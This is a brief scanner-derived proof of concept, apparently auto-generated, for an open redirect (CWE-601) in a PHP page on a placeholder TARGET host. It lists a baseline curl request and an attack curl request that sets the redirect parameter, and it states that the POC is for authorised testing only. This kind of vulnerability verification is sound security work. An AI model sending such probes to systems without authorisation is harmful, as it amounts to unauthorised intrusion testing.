# POC — AWVS: Open Redirect

- finding_id: `URL-b6843f1f6222`
- type: `open_redirect` / CWE-601
- severity: `medium`
- file: `:0`

## 步骤

1. **Baseline request**  
```http
curl -sS -i -X GET 'http://TARGET:8080/035.php?redirect=SafeText' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*'
```
预期：HTTP 200 and the normal application response.

2. **Replay the AWVS attack request (开放重定向)**  
```http
curl -sS -i -X GET 'http://TARGET:8080/035.php?redirect=info.php' \
  -H 'User-Agent: Sunset-AWVS-Probe/2.0' \
  -H 'Accept: */*'
```
预期：The attack response differs from the baseline in status, length, or a security-relevant marker.

3. **Compare baseline and attack responses**  
预期：A security-relevant differential appears.

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。